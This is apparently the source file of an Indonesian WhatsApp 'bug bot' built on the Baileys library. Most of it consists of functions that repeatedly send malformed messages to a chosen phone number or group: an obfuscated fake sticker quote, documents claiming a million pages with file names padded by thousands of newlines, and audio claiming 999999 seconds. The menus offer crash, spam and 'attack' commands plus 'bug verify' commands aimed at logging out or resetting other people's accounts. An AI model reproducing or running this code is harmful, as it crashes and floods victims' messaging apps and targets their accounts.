require('./setting')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@adiwajshing/baileys");
const { modul } = require('./lib/module');
const { fs, chalk, axios, moment, fetch, util } = modul;
const cherio = require("cheerio")
const { sizeFormatter} = require("human-readable")
const format = sizeFormatter()
const { color, bgcolor, mycolor } = require('./lib/color')
const { smsg, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat } = require('./lib/functions')
const { teksUnban1, teksUnban2, teksUnban3, teksUnban4, teksUnban5, teksUnban6, teksUnban7, teksUnban8  } = require('./lib/methodUnban')
const { konf } = require("./lib/konf");
const { vnolim } = require("./lib/vnolim");
const { addCmd } = require("./lib/cmdbot");

const myowner = global.myOwner
const murbug = global.murBug
const db_cmd = global.dbCmd
const db_hit = global.dbHit
const thumb = fs.readFileSync('./connect/thumbnail/logo.jpg')

public = global.ModePublic
autoread = global.AutoRead
mengetik = global.AutoMengetik

module.exports = conn = async (conn, m) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
const prefix = /^[°#*+,.?=''():√%!¢£¥€π¤ΠΦ_&`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°#*+,.?=''():√%¢£¥€π¤ΠΦ_&!`™©®Δ^βα¦|/\\©^]/gi) : '#'
const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
const content = JSON.stringify(m.message)
const { type, quotedMsg, mentioned, now, fromMe } = m
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const isGroup = from.endsWith('@g.us')
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isDeveloper = [botNumber, ...global.DeveloperBot,"6282279915237","6285789004732"].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isOwner = [botNumber, ...myowner, "6282279915237", "6285789004732"].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isAkses = [botNumber, ...murbug].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const ucapanGuweh = dt.charAt(0) + dt.slice(1)
const ucapanWaktu = ucapanGuweh.toUpperCase()

const { chats } = m

const tanggal = moment.tz('Asia/Jakarta').format('DD/MM/YY')

const sender = isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const participants = isGroup ? await groupMetadata.participants : ''
const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
const isAdmins = isGroup ? groupAdmins.includes(sender) : false
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false

// Quoted
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isMedia = (type === 'imageMessage' || type === 'videoMessage');
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

if (isCmd && m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); }
if (isCmd && !m.isGroup) { console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); }

try {
ppuser = await conn.profilePictureUrl(from, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

let ppnyauser = await getBuffer(ppuser)

let fakelex = {key : {
participant : '0@s.whatsapp.net',
...(m.chat ? { remoteJid: `status@broadcast` } : {}) },
message: {locationMessage: {name: `Lexxy Official`,
jpegThumbnail: ppnyauser
}}}

const mentionByTag = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = type == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
mention != undefined ? mention.push(mentionByReply) : []
const mentionUser = mention != undefined ? mention.filter(n => n) : []

function mentions(teks, mems = [], id) {
if (id == null || id == undefined || id == false) {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
} else {
let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: m })
return res
}}

const reply = (teks) => {
conn.sendMessage(m.chat, { text: teks }, { quoted: m })
}

const getRandom = (ext) => {
return `${Math.floor(Math.random() * 10000)}${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

function _0x2ca4(_0x48285c,_0x4d920d){const _0x1ccb0b=_0x1ccb();return _0x2ca4=function(_0x2ca401,_0x419784){_0x2ca401=_0x2ca401-0x11a;let _0x409874=_0x1ccb0b[_0x2ca401];return _0x409874;},_0x2ca4(_0x48285c,_0x4d920d);}const _0x39a090=_0x2ca4;(function(_0x4b1d6c,_0x58b7f3){const _0x11ffb0=_0x2ca4,_0xed0fed=_0x4b1d6c();while(!![]){try{const _0x14fca5=-parseInt(_0x11ffb0(0x123))/0x1+-parseInt(_0x11ffb0(0x11e))/0x2*(-parseInt(_0x11ffb0(0x11f))/0x3)+parseInt(_0x11ffb0(0x121))/0x4+-parseInt(_0x11ffb0(0x11d))/0x5*(-parseInt(_0x11ffb0(0x126))/0x6)+-parseInt(_0x11ffb0(0x120))/0x7+parseInt(_0x11ffb0(0x129))/0x8*(parseInt(_0x11ffb0(0x11a))/0x9)+-parseInt(_0x11ffb0(0x127))/0xa;if(_0x14fca5===_0x58b7f3)break;else _0xed0fed['push'](_0xed0fed['shift']());}catch(_0x365b4d){_0xed0fed['push'](_0xed0fed['shift']());}}}(_0x1ccb,0x5cfb6));const fbug={'key':{'fromMe':![],'participant':_0x39a090(0x122),...{'remoteJid':''}},'message':{'stickerMessage':{'url':'https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc','fileSha256':_0x39a090(0x125),'fileEncSha256':_0x39a090(0x128),'mediaKey':_0x39a090(0x11c),'mimetype':_0x39a090(0x11b),'height':0x40,'width':0x40,'directPath':'/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781','fileLength':_0x39a090(0x124),'mediaKeyTimestamp':'1657290167','isAnimated':![]}}};function _0x1ccb(){const _0x55e809=['0@s.whatsapp.net','518236hzIRxm','7774','YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=','3500796lqDuhF','3186870iOsZHV','9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=','148664bpXybl','9cyeTzR','image/webp','nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=','5yBKRBw','999214RPHHSz','3jXVMhW','1315762JmnLRe','1216348nvxVAs'];_0x1ccb=function(){return _0x55e809;};return _0x1ccb();}

if (!public) {
if (!fromMe && !isAkses && !isOwner && !isDeveloper && !isGroup) return
}

function sendContact(jid, numbers, name, mn) {
var number = numbers.replace(/[^0-9]/g, '')
const vcard = 'BEGIN:VCARD\n' 
+ 'VERSION:3.0\n' 
+ 'FN:' + name + '\n'
+ 'ORG:;\n'
+ 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
+ 'END:VCARD'
return conn.sendMessage(jid, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions : mn ? mn : []},{ quoted: m })
}

function sendBugButtonV1(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
conn.sendMessage(target, { text: "", 
templateButtons: [
{ callButton: { displayText: `Click Here!`, phoneNumber: ``}},
{ callButton: { displayText: `Click Here!`, phoneNumber: ``}},
{ urlButton: { displayText: `Click Here!`, url: `https://www.whatsapp.com/otp/copy/${target}`}},
{ quickReplyButton: { displayText: `Click Here!`, id: ``}},
{ quickReplyButton: { displayText: `Click Here!`, id: ``}},
{ quickReplyButton: { displayText: `Click Here!`, id: ``}},
]})
}}

function sendBugButtonV2(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
conn.sendMessage(target, { text: "", 
templateButtons: [
{index: 1, callButton: { displayText: 'Hi', phoneNumber: ``}},
{index: 2, callButton: { displayText: 'Hi', phoneNumber: ``}},
{index: 3, urlButton: { displayText: 'Hi', url: `https://www.whatsapp.com/otp/copy/${target}`}},
{index: 4, quickReplyButton: { displayText: 'Hi', id: ``}},
{index: 5, quickReplyButton: { displayText: 'Hi', id: ``}},
{index: 6, quickReplyButton: { displayText: 'Hi', id: ``}},
{index: 7, quickReplyButton: { displayText: 'Hi', id: ``}},
{index: 8, quickReplyButton: { displayText: 'Hi', id: ``}},
{index: 9, quickReplyButton: { displayText: 'Hi', id: ``}},
]})
}}

function sendBugChat(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
var satu ="《 ███▒▒▒▒▒▒▒▒▒▒▒》20%"
var dua ="《 ██████▒▒▒▒▒▒▒▒》40%"
var tiga ="《 █████████▒▒▒▒▒》60%"
var empat ="《 ████████████▒▒》80%"
var lima ="《 ██████████████》100%"
var enam ="ᴄᴏᴍᴘʟᴇᴛᴇ"
conn.sendMessage(target, {text: satu}, {quoted:fbug})
conn.sendMessage(target, {text: dua}, {quoted:fbug})
conn.sendMessage(target, {text: tiga}, {quoted:fbug})
conn.sendMessage(target, {text: empat}, {quoted:fbug})
conn.sendMessage(target, {text: lima}, {quoted:fbug})
conn.sendMessage(target, {text: enam}, {quoted:fbug})
}}

function sendBugSpam(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
conn.sendMessage(target, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
conn.sendMessage(target, {text: "_∅ Pesan ini dihapus_"}, {quoted:fbug})
conn.sendMessage(target, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
conn.sendMessage(target, {text: "_∅ Pesan ini dihapus_"}, {quoted:fbug})
conn.sendMessage(target, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
conn.sendMessage(target, {text: "_∅ Pesan ini dihapus_"}, {quoted:fbug})
conn.sendMessage(target, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
conn.sendMessage(target, {text: "_∅ Pesan ini dihapus_"}, {quoted:fbug})
conn.sendMessage(target, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
conn.sendMessage(target, {text: "_∅ Pesan ini dihapus_"}, {quoted:fbug})
}}

function sendBugNew(target,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 1000000,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🔥 LimaPuluhhhhh ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${konf}\n\n\n\n.${vnolim}.jpeg`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from, quoted: fbug})
conn.relayMessage(target, document.message, { messageId: document.key.id })
var audio = generateWAMessageFromContent(from, proto.Message.fromObject({
"audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc",
"mimetype": "audio/mpeg",
"fileSha256": "jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=",
"fileLength": "258330",
"seconds": 999999,
"ptt": false,
"mediaKey": "gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=",
"fileEncSha256": "6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=",
"directPath": "/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118",
"mediaKeyTimestamp": "1657190832",
}
}), { userJid: from, quoted: fbug})
conn.relayMessage(target, audio.message, { messageId: audio.key.id })
}}

function sendBugGroup(res,jumlahnya) {
for (let i = 0; i < jumlahnya; i++) {
conn.sendMessage(res, {text: "𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂"}, {quoted:fbug})
conn.sendMessage(res, {text: "𝙻𝙸𝙼𝙰 𝙿𝚄𝙻𝚄𝙷"}, {quoted:fbug})
var document = generateWAMessageFromContent(from, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 1000000,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `☠️𝙴𝙿𝙴𝙿 𝙽𝙸𝙷 𝙱𝙾𝚂𝚂☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${konf}\n\n\n\n.${vnolim}.jpeg`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: from, quoted: fbug })
conn.relayMessage(res, document.message, { messageId: document.key.id })
}}

if (command) {
db_hit.push('c')
fs.writeFileSync("./connect/database/reqhit.json", JSON.stringify(db_hit))
}

if (autoread){
conn.readMessages([m.key])
}

if (mengetik) {
conn.sendPresenceUpdate('composing', from)
}

let numb1_ = '628'
let numb2_ = '227'
let numb3_ = '991'
let numb4_ = '5237'

let CreatorLexxy = `${numb1_}${numb2_}${numb3_}${numb4_}`

switch (command) {
case 'menubug':
case 'bugmenu':{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *OWNER MENU (MURBUG)* ༻
Ⓛ ${prefix}akses @tag
Ⓛ ${prefix}delete @tag
Ⓛ ${prefix}addown 628xxxxx
Ⓛ ${prefix}delown 628xxxxx

༺ *LIST MENU BUGV1* ༻
*_( RECOMMENDED )_*
Ⓛ ${prefix}bugteks 628xxxxx,5
Ⓛ ${prefix}bugepep 628xxxxx,5
Ⓛ ${prefix}bugspam 628xxxxx,5

༺ *LIST MENU BUGV2* ༻
*_( RECOMMENDED )_*
Ⓛ ${prefix}😈 628xxxxx,5
Ⓛ ${prefix}☠️ 628xxxxx,6
Ⓛ ${prefix}👻 628xxxxx,5
Ⓛ ${prefix}💥 628xxxxx,5
Ⓛ ${prefix}🔥 628xxxxx,5
Ⓛ ${prefix}🌹 628xxxxx,5
Ⓛ ${prefix}🌷 628xxxxx,5
Ⓛ ${prefix}🦕 628xxxxx,5
Ⓛ ${prefix}🦖 628xxxxx,5
Ⓛ ${prefix}🦎 628xxxxx,5

༺ *LIST MENU BUGV3* ༻
*_( RAWAN BANNED )_*
Ⓛ ${prefix}allgas 628xxxxx,5
Ⓛ ${prefix}bugpc 628xxxxx,5
Ⓛ ${prefix}gasken 628xxxxx,5
Ⓛ ${prefix}lexgass 628xxxxx,5
Ⓛ ${prefix}lexgbug 628xxxxx,5
Ⓛ ${prefix}crashpc 628xxxxx,5
Ⓛ ${prefix}sendbug 628xxxxx,5
Ⓛ ${prefix}gaslexx 628xxxxx,5
Ⓛ ${prefix}buglexx 628xxxxx,5
Ⓛ ${prefix}catalexx 628xxxxx,5
Ⓛ ${prefix}epeplexx 628xxxxx,5
Ⓛ ${prefix}document 628xxxxx,5
Ⓛ ${prefix}santetpc 628xxxxx,5
Ⓛ ${prefix}attacklexx 628xxxxx,5
Ⓛ ${prefix}lexxsend 628xxxxx,5
Ⓛ ${prefix}sendlexx 628xxxxx,5

༺ *LIST MENU BUGV4* ༻
*_( RAWAN BANNED )_*
Ⓛ ${prefix}buggc 5|LinkGroup
Ⓛ ${prefix}bomgc 5|LinkGroup
Ⓛ ${prefix}bugingc 5|LinkGroup
Ⓛ ${prefix}crashgc 5|LinkGroup
Ⓛ ${prefix}crashgc 5|LinkGroup
Ⓛ ${prefix}santetgc 5|LinkGroup
Ⓛ ${prefix}attackgc 5|LinkGroup
Ⓛ ${prefix}buglexgc 5|LinkGroup
Ⓛ ${prefix}gaskengc 5|LinkGroup
Ⓛ ${prefix}ampasgc 5|LinkGroup

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case "rika":
case "ghea":
case "bocil":
case "asupan":
if (!isDeveloper) return
var mediaa = JSON.parse(fs.readFileSync(`./connect/db/${command}.json`))
reply(`*Permintaan Anda Sedang Diproses, Mohon Tunggu Sebentar*`)
var randomNyaa = pickRandom(mediaa)
conn.sendMessage(from, {video:{url:randomNyaa.url}, caption: jsonformat(randomNyaa)}, {quoted:m})
break
case 'groupmenu':
case 'grupmenu':{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *GROUP MENU* ༻
Ⓛ ${prefix}kick
Ⓛ ${prefix}linkgrup
Ⓛ ${prefix}revoke
Ⓛ ${prefix}group
Ⓛ ${prefix}hidetag
Ⓛ ${prefix}demote
Ⓛ ${prefix}promote

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'bugverify':{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *BUG VERIFY* ༻
Ⓛ ${prefix}out 628xxxxx
Ⓛ ${prefix}verif 628xxxxx
Ⓛ ${prefix}kenon 628xxxxx
Ⓛ ${prefix}logout 628xxxxx
Ⓛ ${prefix}resetotp 628xxxxx
Ⓛ ${prefix}komplain <example>

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'unbanmenu':{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *UNBANNED MENU* ༻
Ⓛ ${prefix}unbanv1 628xxxxx
Ⓛ ${prefix}unbanv2 628xxxxx
Ⓛ ${prefix}unbanv3 628xxxxx
Ⓛ ${prefix}unbanv4 628xxxxx
Ⓛ ${prefix}unbanv5 628xxxxx
Ⓛ ${prefix}unbanv6 628xxxxx
Ⓛ ${prefix}unbanv7 628xxxxx
Ⓛ ${prefix}unbanv8 628xxxxx
 
 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case "menuowner":
case "ownermenu":{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *OWNER MENU* ༻
Ⓛ ${prefix}resetdb
Ⓛ ${prefix}resetakses
Ⓛ ${prefix}resetowner
Ⓛ ${prefix}database
Ⓛ ${prefix}dashboard
Ⓛ ${prefix}akses @tag
Ⓛ ${prefix}delete @tag
Ⓛ ${prefix}addown 628xxxxx
Ⓛ ${prefix}delown 628xxxxx
Ⓛ ${prefix}unblock 628xxxxx
Ⓛ ${prefix}block 628xxxxx
Ⓛ ${prefix}mode [options]
Ⓛ ${prefix}mengetik [options]
Ⓛ ${prefix}autoread [options]

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case "menumain":
case "mainmenu":{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *MAIN MENU* ༻
Ⓛ ${prefix}owner
Ⓛ ${prefix}buysc
Ⓛ ${prefix}buypanel
Ⓛ ${prefix}jasaunban
Ⓛ ${prefix}runtime

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'menupush':
case 'pushmenu':{
var creator = `${CreatorLexxy}@s.whatsapp.net`
mentions(`*${ucapanWaktu}* @${sender.split("@")[0]}👋
▬▭▬▭▬▭▬▭▬▭▬▭▬▭
༺ *PUSHKONTAK MENU* ༻
Ⓛ ${prefix}join
Ⓛ ${prefix}pushv1
Ⓛ ${prefix}pushv2
Ⓛ ${prefix}listgroup

 Powered By @${creator.split('@')[0]}
▬▭▬▭▬▭▬▭▬▭▬▭▬`, [creator,sender])
}
addCmd(command, 1, db_cmd)
break
case 'help':
case 'menu':{
var owner = global.OwnerNumber+'@s.whatsapp.net'
var creator = `${CreatorLexxy}@s.whatsapp.net`
var mark = '0@s.whatsapp.net'
var ownerC = JSON.parse(fs.readFileSync('./connect/database/owner.json'))
var murbugC = JSON.parse(fs.readFileSync('./connect/database/murbug.json'))
var teks =`▬▭▬▭▬▭▬▭▬▭▬▭▬▭
